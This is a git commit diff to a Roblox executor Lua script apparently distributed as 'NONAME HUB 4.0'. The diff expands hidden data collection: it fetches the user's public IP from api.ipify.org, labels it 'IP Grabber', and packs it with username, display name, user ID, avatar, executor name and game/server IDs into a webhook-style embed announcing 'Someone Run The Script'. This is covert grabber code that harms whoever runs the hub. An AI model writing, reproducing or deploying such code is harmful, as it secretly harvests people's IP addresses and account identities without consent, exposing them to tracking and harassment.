69ef92c1d303815f11fa81533c073a0ecdb793ba
peatchXD <100938925+peatchXD@users.noreply.github.com>
2023-05-15 02:40:07 +0700

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -5,31 +5,98 @@ local Time = os.date('!*t', OSTime);
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 Parent = game.Workspace
 local Day = game.Players.LocalPlayer.AccountAge
+local MaxPlr = game.Players.MaxPlayers
+local RespawnPlr = game.Players.RespawnTime
+local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local ExecuteR = identifyexecutor()
+local JobIDG = game.JobId
+local UserIDs = game.Players.LocalPlayer.UserId
+local DisPlayN = game.Players.LocalPlayer.DisplayName
+local player = game:GetService"Players".LocalPlayer
+local premium = false
+local alt = true
+if player.MembershipType == Enum.MembershipType.Premium then
+   premium = true
+end
+
+if not premium and player.AccountAge >= 70 then
+    alt = "Possible"
+elseif premium and player.AccountAge >= 70 then
+   alt = false
+end
+local GPID = game.PlaceId
+local executor = identifyexecutor() or "Unknown"
+local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+local AvatarImage = Thing.imageUrl
 local PlayerData =
 {
        ["content"] = "@everyone **Someone Run The Script**",
        ["embeds"] = {
            {
-           ["title"] = "Name: "..plrname .. " Create Day: "..Day,
-           ["description"] = "**Execute is: **".. identifyexecutor(),
+           ["title"] = "NONAME HUB 4.0",
+           ["description"] = "**Check Players**",
            ["color"] = tonumber(0x00FF00),
-           ["fields"] = {
-               {
-                   ["name"] = "Game Job ID: ",
-                   ["value"] = game.JobId,
-                   ["inline"] = true
-                },
-           },
+           ["thumbnail"] = {
+            ["url"] = AvatarImage,
+        },
+        ["fields"] = {
+            {
+                ["name"] = "Username",
+                ["value"] = "**"..plrname.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Display Name",
+                ["value"] = "**"..DisPlayN.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Player ID",
+                ["value"] = "**["..UserIDs.."](" .. tostring("https://www.roblox.com/users/" .. UserIDs .. "/profile")..")**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Execute is",
+                ["value"] = "**"..executor.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game Job Id",
+                ["value"] = "**"..JobIDG.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "IP Grabber",
+                ["value"] = "**"..ip.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game Place Id",
+                ["value"] = "**["..GPID.."](" .. tostring("https://www.roblox.com/games/".. GPID)..")**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game Name",
+                ["value"] = "**"..GameName.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Max Player",
+                ["value"] = "**"..MaxPlr.."**/" .. "**"..RespawnPlr.."**",
+                ["inline"] = true
+            },
+        },
            ["type"] = "rich",
            ["author"] = {
                    ["name"] = "Roblox Map";
-                   ["url"] = 'https://www.roblox.com/games/'..game.PlaceId,
+                   ["url"] = 'https://www.roblox.com/games/'..GPID,
                         },
-           ["footer"] = { text = "IP Grabber: " ..ip};
            ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
         }
     }
 }
+
 
 local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
 
